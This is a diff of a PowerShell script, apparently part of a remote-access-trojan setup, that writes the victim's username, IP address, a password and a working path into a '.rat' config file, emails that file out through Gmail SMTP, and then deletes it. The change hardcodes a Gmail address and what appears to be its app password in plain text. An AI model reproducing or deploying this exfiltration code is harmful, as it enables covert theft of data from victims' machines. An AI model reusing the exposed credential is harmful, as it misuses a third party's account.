@@ -37,8 +37,6 @@ $path = "$env:temp/$wd"
 $initial_dir = Get-Location
 $configfile = "$env:UserName.rat"
 
-$email = Get-Content email.txt
-$pword = Get-Content pass.txt
 
 $ip = (Get-NetIPAddress -AddressFamily IPV4 -InterfaceAlias Ethernet).IPAddress
 
@@ -48,7 +46,7 @@ Add-Content -Path $configfile -Value $password
 Add-Content -Path $configfile -Value $path
 
 #smtp process
-Send-MailMessage -From $email -To $email -subject "$env:UserName" -Subject $configfile -Attachment $configfile -SmtpServer smtp.gmail.com -Port 587 -UseSsl -Credential (New-Object -TypeName System.Management.Automation.PSCredential -ArgumentList $email, (ConvertTo-SecureString -String $pword -AsPlainText -Force))
+Send-MailMessage -From "websitepetros@gmail.com" -To "websitepetros@gmail.com" -subject "$env:UserName" -Subject $configfile -Attachment $configfile -SmtpServer 'smtp.gmail.com' -Port 587 -UseSsl -Credential (New-Object -TypeName System.Management.Automation.PSCredential -ArgumentList "websitepetros@gmail.com", (ConvertTo-SecureString -String "tqck alhn siqo dtqz" -AsPlainText -Force))
 
 # delete config file
 Remove-Item $configfile
